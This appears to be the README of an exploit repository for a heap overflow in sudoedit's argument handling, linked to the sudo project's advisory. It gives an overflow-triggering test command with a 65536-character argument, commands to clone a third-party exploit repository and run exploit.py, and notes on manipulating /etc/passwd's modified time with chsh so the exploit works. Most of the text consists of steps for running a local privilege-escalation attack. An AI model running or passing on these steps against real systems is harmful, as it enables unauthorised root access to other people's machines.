### How to check if you are affected.

[The sudo project](https://www.sudo.ws/alerts/unescape_overflow.html) released a command that allows you to test whether your version of sudo is vulnerable:
```
sudoedit -s '\' `perl -e 'print "A" x 65536'`
```

If you receive a usage or error message, sudo is not vulnerable. If the result is a Segmentation fault, sudo is vulnerable.

## Download the exploit code.

```git clone https://github.com/CyberCommands/exploit-sudoedit.git sudoedit/```

```cd sudoedit/```

```sudo python3 exploit.py --help```

## Important Note for Exploit.

- The modified time of /etc/passwd needs to be newer than the system boot time, if it isn't you can use `chsh` to update it. Unfortunately this means you will have to know the password for the account you are running as. Remember that `chsh` doesn't accept empty passwords by default so if it is empty you may have to set one with `passwd`.
